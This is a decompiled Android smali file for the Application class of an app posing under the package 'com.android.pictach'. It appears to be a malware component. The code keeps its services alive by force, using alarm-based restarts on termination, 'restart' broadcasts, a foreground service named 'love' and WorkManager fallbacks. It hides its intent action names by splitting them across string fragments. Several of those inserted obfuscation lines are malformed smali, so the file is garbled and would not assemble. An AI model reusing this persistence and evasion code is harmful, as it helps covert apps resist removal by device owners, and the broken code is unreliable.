.class public Lcom/android/pictach/App;
.super Landroid/app/Application;
.source "hzlfgknm.java"

# optimised-23039
# ep-npjkvfbipqep

# static fields
.field private static final RESTART_INTERVAL:J = 0xea60L

.field private static final TAG:Ljava/lang/String; = "App"

.field private static applicationContext:Landroid/content/Context;


# instance fields
.field private appWakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    return-void
.end method

.method public static getContext()Landroid/content/Context;
    .locals 16

    sget-object v0, Lcom/android/pictach/App;->applicationContext:Landroid/content/Context;

    return-object v0
.end method

.method private scheduleServiceRestart()V
    .locals 16

    .line 1
    :try_start_0
    const-string v0, "alarm"

    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/app/AlarmManager;

    .line 9
    new-instance v1, Landroid/content/Intent;

    .line 11
    const-class v2, Lcom/android/pictach/MyReceiver;

    .line 13
    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 16
    const-string v2,new-instance v15, Ljava/lang/StringBuilder;
    const-string v2,invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2,const-string v2, "RE"
    const-string v2,invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2,const-string v2, "START_SE"
    const-string v2,invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2,const-string v2, "RVICE"
    const-string v2,invoke-virtual {v15, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2,invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    const-string v2,move-result-object v2

    .line 18
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 21
    const/16 v2, 0x3e9

    .line 23
    const/high16 v3, 0xc000000

    .line 25
    invoke-static {p0, v2, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 28
    move-result-object v1

    .line 29
    if-eqz v0, :cond_1

    .line 31
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 33
    const/16 v3, 0x17

    .line 35
    const-wide/32 v4, 0xea60

    .line 38
    if-lt v2, v3, :cond_0

    .line 40
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 43
    move-result-wide v2

    .line 44
    add-long/2addr v2, v4

    .line 45
    invoke-static {v0, v2, v3, v1}, Lr;->d(Landroid/app/AlarmManager;JLandroid/app/PendingIntent;)V

    .line 48
    goto :goto_0

    .line 49
    :cond_0
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    .line 52
    move-result-wide v2

    .line 53
    add-long/2addr v2, v4

    .line 54
    const/4 v4, 0x2

    .line 55
    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExact(IJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 58
    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method private startService(Ljava/lang/Class;)V
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/Class<",
            "*>;)V"
        }
    .end annotation

    .line 1
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    .line 3
    invoke-direct {v0, p0, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 6
    const-string p1, "fromApp"

    .line 8
    const/4 v1, 0x1

    .line 9
    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 12
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 14
    const/16 v1, 0x1a

    .line 16
    if-lt p1, v1, :cond_0

    .line 18
    invoke-virtual {p0, v0}, Landroid/app/Application;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 21
    goto :goto_0

    .line 22
    :cond_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 25
    :catch_0
    :goto_0
    return-void
.end method


# virtual methods
.method public onCreate()V
    .locals 16

    .line 1
    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    .line 4
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 7
    move-result-object v0

    .line 8
    sput-object v0, Lcom/android/pictach/App;->applicationContext:Landroid/content/Context;

    .line 10
    new-instance v0, Landroidx/work/a$a;

    .line 12
    invoke-direct {v0}, Landroidx/work/a$a;-><init>()V

    .line 15
    new-instance v1, Landroidx/work/a;

    .line 17
    invoke-direct {v1, v0}, Landroidx/work/a;-><init>(Landroidx/work/a$a;)V

    .line 20
    invoke-static {p0, v1}, LWorkManagerImpl;->t(Landroid/content/Context;Landroidx/work/a;)V

    .line 23
    invoke-static {p0}, Lm7;->g(Landroid/content/Context;)V

    .line 26
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 28
    const/16 v1, 0x17

    .line 30
    if-lt v0, v1, :cond_0

    .line 32
    invoke-static {p0}, Ld4;->b(Landroid/content/Context;)Z

    .line 35
    move-result v0

    .line 36
    if-nez v0, :cond_1

    .line 38
    sget-object v0, Ld4;->a:Landroid/os/Handler;

    .line 40
    new-instance v1, Lc4;

    .line 42
    invoke-direct {v1, p0}, Lc4;-><init>(Landroid/content/Context;)V

    .line 45
    const-wide/16 v2, 0x7d0

    .line 47
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 50
    goto :goto_0

    .line 51
    :cond_0
    sget-object v0, Ld4;->a:Landroid/os/Handler;

    .line 53
    :cond_1
    :goto_0
    invoke-static {p0}, Lg4;->c(Landroid/content/Context;)V

    .line 56
    invoke-static {p0}, Lg4;->b(Landroid/content/Context;)V

    .line 59
    invoke-static {p0}, Lcom/android/pictach/WackMeUpJob;->a(Landroid/content/Context;)V

    .line 62
    new-instance v0, Landroid/content/Intent;

    .line 64
    const-string v1,new-instance v15, Ljava/lang/StringBuilder;
    const-string v1,invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V
    const-string v1,const-string v1, "Res"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,const-string v1, "tartS"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,const-string v1, "ensor"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    const-string v1,move-result-object v1

    .line 66
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 69
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 72
    return-void
.end method

.method public onTerminate()V
    .locals 16

    .line 1
    invoke-super {p0}, Landroid/app/Application;->onTerminate()V

    .line 4
    iget-object v0, p0, Lcom/android/pictach/App;->appWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 6
    if-eqz v0, :cond_0

    .line 8
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    .line 11
    move-result v0

    .line 12
    if-eqz v0, :cond_0

    .line 14
    :try_start_0
    iget-object v0, p0, Lcom/android/pictach/App;->appWakeLock:Landroid/os/PowerManager$WakeLock;

    .line 16
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 19
    :catch_0
    :cond_0
    sget-object v0, Ld4;->a:Landroid/os/Handler;

    .line 21
    if-eqz v0, :cond_1

    .line 23
    const/4 v1, 0x0

    .line 24
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    .line 27
    :cond_1
    invoke-direct {p0}, Lcom/android/pictach/App;->scheduleServiceRestart()V

    .line 30
    new-instance v0, Landroid/content/Intent;

    .line 32
    const-string v1,new-instance v15, Ljava/lang/StringBuilder;
    const-string v1,invoke-direct {v15}, Ljava/lang/StringBuilder;-><init>()V
    const-string v1,const-string v1, "Re"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,const-string v1, "start"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,const-string v1, "Sensor"
    const-string v1,invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1,invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    const-string v1,move-result-object v1

    .line 34
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 37
    invoke-virtual {p0, v0}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 40
    return-void
.end method

.method public startAllPersistentServices()V
    .locals 16

    .line 1
    :try_start_0
    const-class v0, Lcom/android/pictach/love;

    .line 3
    invoke-direct {p0, v0}, Lcom/android/pictach/App;->startService(Ljava/lang/Class;)V

    .line 6
    nop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 11
    goto :goto_0

    .line 12
    :catch_0
    :try_start_1
    new-instance v0, Lnn$a;

    .line 14
    const-class v1, Lcom/android/pictach/ServiceStarterWorker;

    .line 16
    invoke-direct {v0, v1}, Lnn$a;-><init>(Ljava/lang/Class;)V

    .line 19
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    .line 21
    const-wide/16 v2, 0x5

    .line 23
    invoke-virtual {v0, v2, v3, v1}, Lx00$a;->e(JLjava/util/concurrent/TimeUnit;)Lx00$a;

    .line 26
    move-result-object v0

    .line 27
    check-cast v0, Lnn$a;

    .line 29
    invoke-virtual {v0}, Lx00$a;->a()Lx00;

    .line 32
    move-result-object v0

    .line 33
    check-cast v0, Lnn;

    .line 35
    invoke-static {p0}, LWorkManagerImpl;->s(Landroid/content/Context;)LWorkManagerImpl;

    .line 38
    move-result-object v1

    .line 39
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 42
    invoke-static {v0}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    .line 45
    move-result-object v0

    .line 46
    invoke-virtual {v1, v0}, LWorkManagerImpl;->p(Ljava/util/List;)Lon;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 49
    :catch_1
    :goto_0
    return-void
.end method
